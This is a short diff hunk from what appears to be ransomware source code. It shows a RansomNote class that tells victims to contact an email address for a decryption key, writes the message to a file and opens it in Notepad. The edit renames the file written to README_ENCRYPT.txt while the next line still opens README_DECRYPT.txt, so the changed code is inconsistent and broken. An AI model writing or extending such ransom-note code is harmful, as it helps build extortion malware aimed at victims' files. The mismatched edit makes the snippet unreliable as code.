@@ -96,7 +96,7 @@ class RansomNote:
         To get the key and decrypt your files, contact us.
         hackers@example.com
         """
-        with open("README_DECRYPT.txt", "w", encoding="utf-8") as f:
+        with open("README_ENCRYPT.txt", "w", encoding="utf-8") as f:
             f.write(note)
         os.system("notepad README_DECRYPT.txt")
 
